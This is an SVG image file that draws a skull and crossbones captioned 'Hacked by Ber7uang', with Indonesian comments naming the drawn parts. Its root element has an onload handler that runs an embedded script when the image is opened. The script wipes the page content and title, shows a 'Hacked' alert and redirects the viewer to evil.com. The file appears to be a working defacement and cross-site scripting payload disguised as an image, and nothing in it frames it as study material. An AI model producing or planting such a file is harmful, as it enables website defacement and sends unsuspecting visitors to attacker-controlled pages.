<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 500 500" onload="exploit()">
  <script type="text/javascript">
    function exploit() {
      document.body.innerHTML = '';
      document.title = '';
      alert('Hacked by Ber7uang');
      window.location.replace('https://evil.com');
    }
  </script>
  
  <rect width="500" height="500" fill="#0a0a0a"/>
  
  <!-- Tengkorak -->
  <ellipse cx="250" cy="200" rx="90" ry="100" fill="#ddd"/>
  <path d="M 170 230 Q 170 330 250 350 Q 330 330 330 230" fill="#ccc"/>
  
  <!-- Mata -->
  <circle cx="215" cy="185" r="22" fill="#111"/>
  <circle cx="285" cy="185" r="22" fill="#111"/>
  <circle cx="212" cy="180" r="8" fill="#800"/>
  <circle cx="282" cy="180" r="8" fill="#800"/>
  
  <!-- Hidung -->
  <path d="M 245 220 L 250 215 L 255 220 L 250 230 Z" fill="#222"/>
  
  <!-- Gigi -->
  <rect x="205" y="270" width="12" height="18" rx="2" fill="#fff" stroke="#999" stroke-width="1"/>
  <rect x="220" y="272" width="12" height="18" rx="2" fill="#fff" stroke="#999" stroke-width="1"/>
  <rect x="235" y="270" width="12" height="18" rx="2" fill="#fff" stroke="#999" stroke-width="1"/>
  <rect x="250" y="272" width="12" height="18" rx="2" fill="#fff" stroke="#999" stroke-width="1"/>
  <rect x="265" y="270" width="12" height="18" rx="2" fill="#fff" stroke="#999" stroke-width="1"/>
  <rect x="280" y="272" width="12" height="18" rx="2" fill="#fff" stroke="#999" stroke-width="1"/>
  
  <!-- Tulang -->
  <line x1="180" y1="370" x2="320" y2="410" stroke="#bbb" stroke-width="6" stroke-linecap="round"/>
  <line x1="320" y1="370" x2="180" y2="410" stroke="#bbb" stroke-width="6" stroke-linecap="round"/>
  
  <!-- Teks -->
  <text x="250" y="450" text-anchor="middle" font-family="Impact" font-size="28" fill="#ff0000" font-weight="bold">
    Hacked by Ber7uang
  </text>
</svg>
